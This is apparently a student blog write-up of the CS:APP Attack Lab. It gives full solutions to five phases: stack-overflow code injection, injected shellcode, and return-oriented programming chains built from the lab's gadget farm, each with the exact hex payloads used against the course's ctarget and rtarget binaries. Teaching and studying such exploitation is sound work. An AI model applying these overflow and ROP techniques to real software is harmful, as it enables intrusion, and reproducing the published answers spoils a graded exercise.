---
title: "Attacklab"
date: 2023-02-03T16:41:42+08:00
categories: ["csapp"]
---

## 等待被翻译

非常抱歉，看起来这篇博文还没有被翻译成中文，请等待一段时间

## Set up Environment

Using a docker container is the simplest way, source from yansongsongsong

`docker run --privileged -d -p 1221:22 --name bomb yansongsongsong/csapp:attacklab`

Then using vscode `remote ssh` to connect with it as we described in datalab

password: `THEPASSWORDYOUCREATED`

## Part1: Code Injection Attacks

### phase_1

This phase requires us to call `touch1()` at the end of `test()` in `ctarget`

```c
void test() {
  int val;
  val = getbuf();   // here is a dangerous getbuf call that we can make use of 
  printf("No exploit. Getbuf returned 0x%x\n", val);
}
void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

Firstly let's see assembly code: `objdump -d ctarget > ctarget.asm`

```c++
00401968 <test>:
  401968:  48 83 ec 08            sub    $0x8,%rsp
  40196c:  b8 00 00 00 00         mov    $0x0,%eax
  401971:  e8 32 fe ff ff         callq  4017a8 <getbuf>
  401976:  89 c2                  mov    %eax,%edx
  401978:  be 88 31 40 00         mov    $0x403188,%esi
  40197d:  bf 01 00 00 00         mov    $0x1,%edi
  401982:  b8 00 00 00 00         mov    $0x0,%eax
  401987:  e8 64 f4 ff ff         callq  400df0 <__printf_chk@plt>
  40198c:  48 83 c4 08            add    $0x8,%rsp
```

We notice that there is a call for `getbuf()`, and the address of `touch1` is `004017c0 <touch1>`.

```c++
004017a8 <getbuf>:
  4017a8:  48 83 ec 28            sub    $0x28,%rsp
  4017ac:  48 89 e7               mov    %rsp,%rdi
  4017af:  e8 8c 02 00 00         callq  401a40 <Gets>
  4017b4:  b8 01 00 00 00         mov    $0x1,%eax
  4017b9:  48 83 c4 28            add    $0x28,%rsp
  4017bd:  c3                     retq   
```

Here function `Gets` put the value we input in `%rsp`, see `disas Gets` for more details if you are interested.

Here is the stack:

```c
| return address |
|     0x28       |   
|     0x20       |
|     0x18       |   
|     0x10       |   
|     0x08       |
|     0x00       | 
```

So we should put more things than `0x28`, the additional `0x004017c0`covering the `return address`

Then we get the answer: (**little-endian**)

```c++
00 00 00 00 00 00 00 00    // 64 bit, 8 bytes
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00    // 0x28 bytes
c0 17 40 00                // use `touch1` to cover the return address
```

Save it in `phase_1_raw.txt`(remove the comments) then `./hex2raw <phase_1_raw.txt >phase_1.txt`
then `./ctarget -qi phase_1.txt` to pass the phase_1

### phase_2

This phase we need to call `touch2`, and the cookie should equal to the value

```c
void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    }
    else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

Dump of assembler code for function `touch2`:

```c++
   0x004017ec <+0>:     sub    $0x8,%rsp
   // ....
```

It is clear that we should not only change the return address, but also change the value of `val`(%rdi), to match the `cookie`(0x59b997fa)

How could we change the value of `%rdi`? we can inject `movq $0x59b997fa %rdi` instruction to the buffer.

Here are all of the instructions we need:

```c
movq    $0x59b997fa, %rdi       // move cookie to rdi
pushq   $0x4017ec               // push the touch2 address to the stack
ret                             // pop the stack and jump to the address
```

Saved it in `phase_2_inject.s` then `gcc -c phase_2_inject.s`

Finally `objdump -d phase_2_inject.o` we get the codes

```c
0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
7:   68 ec 17 40 00          pushq  $0x4017ec
c:   c3                      retq 
```

We also need to make sure the codes above can be executed. How could we do that?

Considering the stack:

```c
| return address |    // return address of after calling `get_buf`
|     0x28       |   
|     0x20       |
|     0x18       |   
|     0x10       |   
|     0x08       |
|     0x00       |    // %rsp
```

We can put our codes to `%rsp` and then make the `return address` pointing to that `%rsp`, like this:

```c
|  return: %rsp  |    // return address of after calling `get_buf`
|     ....       |   
|     ....       |
|     ....       |   
|     ret        |   
|     pushq      |
|     move       |    // %rsp
```

How to get the address of `%rsp`? Using **gdb**, `stepi` to `4017a8:  48 83 ec 28            sub    $0x28,%rsp`, then `p $rsp` and we get `0x5561dc78`

Now we can make the answer:

```c
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55
```

Note: if you use gdb to see `%rsp` after calling `getbuf`, you'll see

```c++
0x5561dc78:  0x48 0xc7 0xc7 0xfa 0x97 0xb9 0x59 0x68
0x5561dc80:  0xec 0x17 0x40 0x00 0xc3 0x00 0x00 0x00
0x5561dc88:  0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x5561dc90:  0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x5561dc98:  0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x5561dca0:  0x78 0xdc 0x61 0x55 0x00 0x00 0x00 0x00
```

### phase_3

This phase needs us to call `touch3`, and pass the validation

```c
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    // "%.8x" means put the unsigned hex string of cookie to s
    sprintf(s, "%.8x", val);
    // When using strncmp, actually compare about the ascii
    // ascii string of cookie(ascii): 35 39 62 39 39 37 66 61
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)     //   address of touch3：0x4018fa
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

Now that the address pointer s is unpredictable, we can't directly change the value of it. But we can still change the value of `*sval`(%rdi).

**Note**: This time it is a pointer (simply a value in `phase_2`), we must pass an address to it and then store our hex cookie in that address.

we may consider injecting codes like:

```c++
movq    $address, %rdi          // the address of our cookie
pushq   $0x4018fa               // address of touch3
ret                             // return to touch3
```

But what address should we use? If we put it in the buffer, like:

```c
|  return: %rsp  |    // return address of after calling `get_buf`
|     ....       |   
|     cookie     |
|     ....       |   
|     ret        |   
|     pushq      |
|     move       |    // %rsp: 0x5561dc78
```

We may not get the correct answer. See the codes of `hexmatch` and `touch3`:

```c++
000000000040184c <hexmatch>:
  40184c:  41 54                  push   %r12
  40184e:  55                     push   %rbp
  40184f:  53                     push   %rbx
  // ...
00000000004018fa <touch3>:
  4018fa:  53                     push   %rbx
  // ...
```

As we can see here, the `touch3` and `hexmatch` push data into stack and may **cover** the buffer we try to input.

This is because after we call `Gets()` in `getbuf()`, the stack is like this:

```c
|  return: %rsp  |    // return address of after calling `get_buf`
|     ....       |   
|     ....       |
|     ....       |   
|     ret        |   
|     pushq      |
|     move       |    // %rsp: 0x5561dc78
```

But in the end of getbuf, it will add 0x28 to `%rsp` and then `pushq` and make it `0x5561dca8`, the stack is now like this:

```c
|     ....       | // %rsp: 0x5561dca8
|  return: %rsp  |    
|     ....       | // value here may be covered by push!
|     ....       | // value here may be covered by push!
|     ....       | // value here may be covered by push!
|     ret        |   
|     pushq      |
|     move       | // %rsp before: 0x5561dc78
```

So we have to find a new address to put our hex cookie value, considering using the frame of `test()`, it will not be affected by any `pushq`

```c
|  frame: test   |   
|     ....       | // address: 0x5561dca8
| return address |    
|     ....       |   
| frame: getbuf  |   
|     ....       |   
```

we can make it like this:

```c
|  frame: test   |   
|  cookie value  | // address: 0x5561dca8, in frame of test
|  return: %rsp  | // execute our injected code in 0x5561dc78
|     ....       |   
|     ....       | 
|     ....       |   
|     ret        |   
|     pushq      |
|     move       | // %rsp: 0x5561dc78
```

And now we can get the answer:

```c++
movq    $0x5561dca8, %rdi       // the address of our cookie
pushq   $0x4018fa               // address of touch3
ret                             // return to touch3

// generating the assembly codes
0:  48 c7 c7 a8 dc 61 55   mov    $0x5561dca8,%rdi
7:  68 fa 18 40 00         pushq  $0x4018fa
c:  c3                     retq
```

And make it to the final answer:

```c
48 c7 c7 a8 dc 61 55 68   // address: 0x5561dc78, executing our code
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00   // return to 0x5561dc78
35 39 62 39 39 37 66 61   // our hex cookie saved in $0x5561dca8
```

## Part2: Return-Oriented Programming

In real environment, it's hard to inject code because we have **Stack Randomization** and **Stack Read-Only Access**. So we have to use the current codes(**gadget**) to attack.

For instance:

```c++
void setval_210(unsigned *p)
{
*p = 3347663060U;
}
// compiling...
400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)
400f1b: c3 retq
```

`48 89 c7` is `movq %rax, %rdi` and `c3` is `retq`

So if we starts from `400f18`, it's like we are executing

```c
movq %rax, %rdi
retq
```

### phase_4

This phase requires us to repeat the attack of phase_2, but using `Rtarget`.

we can only use instructions of `movq` `popq` `ret` `nop` and the first eight x86-64 registers (`%rax–%rdi`).

Recall the phase_2, we need to realize:

1. move cookie to `$rdi`
2. execute `touch2`

Firstly `objdump -d rtarget > rtarget.asm` to see what gadgets we can make use of.

If we can find gadgets like `popq %rdi`(5f), that could be quite easy, but we can't find one in farm.

So we decide to use `58（popq %rax)`, the instrcutions are:

```c
popq %rax               // 58
ret                     // c3
moveq %rax, %rdi        // 48 89 c7
ret                     // c3
```

The gadgets we use are:

```c++
00000000004019ca <getval_280>:
  4019ca:  b8 29 58 90 c3         mov    $0xc3905829,%eax
  4019cf:  c3                     retq
00000000004019a0 <addval_273>:
  4019a0:  8d 87 48 89 c7 c3      lea    -0x3c3876b8(%rdi),%eax
  4019a6:  c3                     retq   
```

The stack is like:

```c
| return: touch2 |   
|return: 0x4019a2| // execute 48 89 c7(moveq %rax, %rdi) then ret
|  cookie value  | // after popq, the value here is stored in %rax
|return: 0x4019cc| // execute 58 (popq %rax) then ret
|     ....       |   
|     ....       | 
|     ....       |   
|     ....       |   
|     ....       |
|     ....       | // %get buf start
```

So we can get the answer: (Note: `ret` get 8 bytes of address)

```c
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

### phase_5

This phase requires us to repeat the attack of phase_3, but using `Rtarget`.

Including `movq` `popq` `ret` `nop`, we can now use `movl` and additional `func nop`(`andb`, `orb`, `cmpb`, `testb`). Note these `func nop` do not change the value in our registers.

Recall the phase_3, we need to realize:

1. save cookie in address `x`, move `x` to `$rdi`
2. execute `touch3`

Note we can't declare an address `x` directly like `phase_2` because of **stack randomization**, how could we get the address of `x`?

Although the address of `%rsp` is always changing, **the offset is always the same**. For example, we may put our string in address `%rsp + 0x30`, and pass the address (`%rsp + 0x30`) to `%rdi`.

So we may want to find instructions like:

```c
popq %rax                   // and our offset saved in %rax
lea (%rsp, %rax, 1), %rdi
```

Unlucily, we don't find an instruction for `lea (%rsp, %rax, 1), %rdi`, but we can find another one here:

```c++
00000000004019d6 <add_xy>:
  4019d6:  48 8d 04 37            lea    (%rdi,%rsi,1),%rax
  4019da:  c3                     retq   
```

So we can generate our instrucstions based on `add_xy`:

```c++
// no `movq %rsp, %rdi; ret` found in farm, so use %rax as a temp
movq %rsp, %rax  ret    // 48 89 e0 ... c3   0x401aad <setval_350>
movq %rax, %rdi  ret    // 48 89 c7 ... c3   0x4019c5 <setval_426>
popq %rax   ret         // pop offset to %rax, 58 ... c3  0x4019cc <getval_280>
// no `movq %rax, %rsi` or `movl %eax, %esi` found in farm
// so we have to use `%edx`, `%ecx` as temp
movl %eax, %edx  ret    // 89 c2 ... c3   0x4019dd <getval_481>
movl %edx, %ecx  ret    // 89 d1 ... c3   0x401a34 <getval_159> (38 c9 is a nop)
movl %ecx, %esi  ret    // 89 ce ... c3   0x401a13 <addval_436>
<add_xy>                // lea and ret, 0x4019d6
movq %rax,%rdi   ret    // 48 89 c7 ... c3  0x4019a2 <addval_273>
```

The stack is like:

```c
| our hex cookie |  // our hex cookie value here
|return: 0x4018fa|  // execute touch3
|return: 0x4019a2|  // execute `movq %rax,%rdi   ret`
|return: 0x4019d6|  // execute <add_xy>
|return: 0x401a13|  // execute `movl %ecx, %esi  ret`
|return: 0x401a34|  // execute `movl %edx, %ecx  ret`
|return: 0x4019dd|  // execute `movl %eax, %edx  ret`
|  offset: 0x??  |  // our offset here
|return: 0x4019cc|  // execute `popq %rax   ret`
|return: 0x4019c5|  // execute `movq %rax, %rdi   ret`
|return: 0x401aad|  // execute `movq %rsp, %rax   ret`   // %getbuf + 0x30
|     ....       |   
|     ....       | 
|     ....       |   
|     ....       |   
|     ....       |
|     ....       |  // %get buf start
```

But here comes another question: what's the offset should be?

Note: Dump of assembler code for function getbuf

```c++
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401b60 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
=> 0x00000000004017bd <+21>:    retq
```

Recall that when `retq`, the `%rsp` adds `0x8`, and get the address back.

So when executing `movq %rsp, %rax`, the `%rsp` is now pointing at

```c
| our hex cookie |  // %rsp + 0x50
|return: 0x4018fa|  // execute touch3
|return: 0x4019a2|
|return: 0x4019d6|
|return: 0x401a13|
|return: 0x401a34|
|return: 0x4019dd|
|  offset: 0x??  |
|return: 0x4019cc|
|return: 0x4019c5|
|return: 0x401aad|  // execute `movq %rsp, %rax   ret`   // %rsp here
|     ....       |   
|     ....       |
```

So we know the offset is `0x50`

And we can finally get our answer:

```c++
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ad 1a 40 00 00 00 00 00  
c5 19 40 00 00 00 00 00
cc 19 40 00 00 00 00 00
50 00 00 00 00 00 00 00 
dd 19 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
c5 19 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
```

Good luck!

### Appendix: farm

```c++
0000000000401994 <start_farm>:
  401994:  b8 01 00 00 00         mov    $0x1,%eax
  401999:  c3                     retq   

000000000040199a <getval_142>:
  40199a:  b8 fb 78 90 90         mov    $0x909078fb,%eax
  40199f:  c3                     retq   

00000000004019a0 <addval_273>:
  4019a0:  8d 87 48 89 c7 c3      lea    -0x3c3876b8(%rdi),%eax
  4019a6:  c3                     retq   

00000000004019a7 <addval_219>:
  4019a7:  8d 87 51 73 58 90      lea    -0x6fa78caf(%rdi),%eax
  4019ad:  c3                     retq   

00000000004019ae <setval_237>:
  4019ae:  c7 07 48 89 c7 c7      movl   $0xc7c78948,(%rdi)
  4019b4:  c3                     retq   

00000000004019b5 <setval_424>:
  4019b5:  c7 07 54 c2 58 92      movl   $0x9258c254,(%rdi)
  4019bb:  c3                     retq   

00000000004019bc <setval_470>:
  4019bc:  c7 07 63 48 8d c7      movl   $0xc78d4863,(%rdi)
  4019c2:  c3                     retq   

00000000004019c3 <setval_426>:
  4019c3:  c7 07 48 89 c7 90      movl   $0x90c78948,(%rdi)
  4019c9:  c3                     retq   

00000000004019ca <getval_280>:
  4019ca:  b8 29 58 90 c3         mov    $0xc3905829,%eax
  4019cf:  c3                     retq   

00000000004019d0 <mid_farm>:
  4019d0:  b8 01 00 00 00         mov    $0x1,%eax
  4019d5:  c3                     retq   

00000000004019d6 <add_xy>:
  4019d6:  48 8d 04 37            lea    (%rdi,%rsi,1),%rax
  4019da:  c3                     retq   

00000000004019db <getval_481>:
  4019db:  b8 5c 89 c2 90         mov    $0x90c2895c,%eax
  4019e0:  c3                     retq   

00000000004019e1 <setval_296>:
  4019e1:  c7 07 99 d1 90 90      movl   $0x9090d199,(%rdi)
  4019e7:  c3                     retq   

00000000004019e8 <addval_113>:
  4019e8:  8d 87 89 ce 78 c9      lea    -0x36873177(%rdi),%eax
  4019ee:  c3                     retq   

00000000004019ef <addval_490>:
  4019ef:  8d 87 8d d1 20 db      lea    -0x24df2e73(%rdi),%eax
  4019f5:  c3                     retq   

00000000004019f6 <getval_226>:
  4019f6:  b8 89 d1 48 c0         mov    $0xc048d189,%eax
  4019fb:  c3                     retq   

00000000004019fc <setval_384>:
  4019fc:  c7 07 81 d1 84 c0      movl   $0xc084d181,(%rdi)
  401a02:  c3                     retq   

0000000000401a03 <addval_190>:
  401a03:  8d 87 41 48 89 e0      lea    -0x1f76b7bf(%rdi),%eax
  401a09:  c3                     retq   

0000000000401a0a <setval_276>:
  401a0a:  c7 07 88 c2 08 c9      movl   $0xc908c288,(%rdi)
  401a10:  c3                     retq   

0000000000401a11 <addval_436>:
  401a11:  8d 87 89 ce 90 90      lea    -0x6f6f3177(%rdi),%eax
  401a17:  c3                     retq   

0000000000401a18 <getval_345>:
  401a18:  b8 48 89 e0 c1         mov    $0xc1e08948,%eax
  401a1d:  c3                     retq   

0000000000401a1e <addval_479>:
  401a1e:  8d 87 89 c2 00 c9      lea    -0x36ff3d77(%rdi),%eax
  401a24:  c3                     retq   

0000000000401a25 <addval_187>:
  401a25:  8d 87 89 ce 38 c0      lea    -0x3fc73177(%rdi),%eax
  401a2b:  c3                     retq   

0000000000401a2c <setval_248>:
  401a2c:  c7 07 81 ce 08 db      movl   $0xdb08ce81,(%rdi)
  401a32:  c3                     retq   

0000000000401a33 <getval_159>:
  401a33:  b8 89 d1 38 c9         mov    $0xc938d189,%eax
  401a38:  c3                     retq   

0000000000401a39 <addval_110>:
  401a39:  8d 87 c8 89 e0 c3      lea    -0x3c1f7638(%rdi),%eax
  401a3f:  c3                     retq   

0000000000401a40 <addval_487>:
  401a40:  8d 87 89 c2 84 c0      lea    -0x3f7b3d77(%rdi),%eax
  401a46:  c3                     retq   

0000000000401a47 <addval_201>:
  401a47:  8d 87 48 89 e0 c7      lea    -0x381f76b8(%rdi),%eax
  401a4d:  c3                     retq   

0000000000401a4e <getval_272>:
  401a4e:  b8 99 d1 08 d2         mov    $0xd208d199,%eax
  401a53:  c3                     retq   

0000000000401a54 <getval_155>:
  401a54:  b8 89 c2 c4 c9         mov    $0xc9c4c289,%eax
  401a59:  c3                     retq   

0000000000401a5a <setval_299>:
  401a5a:  c7 07 48 89 e0 91      movl   $0x91e08948,(%rdi)
  401a60:  c3                     retq   

0000000000401a61 <addval_404>:
  401a61:  8d 87 89 ce 92 c3      lea    -0x3c6d3177(%rdi),%eax
  401a67:  c3                     retq   

0000000000401a68 <getval_311>:
  401a68:  b8 89 d1 08 db         mov    $0xdb08d189,%eax
  401a6d:  c3                     retq   

0000000000401a6e <setval_167>:
  401a6e:  c7 07 89 d1 91 c3      movl   $0xc391d189,(%rdi)
  401a74:  c3                     retq   

0000000000401a75 <setval_328>:
  401a75:  c7 07 81 c2 38 d2      movl   $0xd238c281,(%rdi)
  401a7b:  c3                     retq   

0000000000401a7c <setval_450>:
  401a7c:  c7 07 09 ce 08 c9      movl   $0xc908ce09,(%rdi)
  401a82:  c3                     retq   

0000000000401a83 <addval_358>:
  401a83:  8d 87 08 89 e0 90      lea    -0x6f1f76f8(%rdi),%eax
  401a89:  c3                     retq   

0000000000401a8a <addval_124>:
  401a8a:  8d 87 89 c2 c7 3c      lea    0x3cc7c289(%rdi),%eax
  401a90:  c3                     retq   

0000000000401a91 <getval_169>:
  401a91:  b8 88 ce 20 c0         mov    $0xc020ce88,%eax
  401a96:  c3                     retq   

0000000000401a97 <setval_181>:
  401a97:  c7 07 48 89 e0 c2      movl   $0xc2e08948,(%rdi)
  401a9d:  c3                     retq   

0000000000401a9e <addval_184>:
  401a9e:  8d 87 89 c2 60 d2      lea    -0x2d9f3d77(%rdi),%eax
  401aa4:  c3                     retq   

0000000000401aa5 <getval_472>:
  401aa5:  b8 8d ce 20 d2         mov    $0xd220ce8d,%eax
  401aaa:  c3                     retq   

0000000000401aab <setval_350>:
  401aab:  c7 07 48 89 e0 90      movl   $0x90e08948,(%rdi)
  401ab1:  c3                     retq   

0000000000401ab2 <end_farm>:
  401ab2:  b8 01 00 00 00         mov    $0x1,%eax
  401ab7:  c3                     retq   
  401ab8:  90                     nop
  401ab9:  90                     nop
  401aba:  90                     nop
  401abb:  90                     nop
  401abc:  90                     nop
  401abd:  90                     nop
  401abe:  90                     nop
  401abf:  90                     nop
```
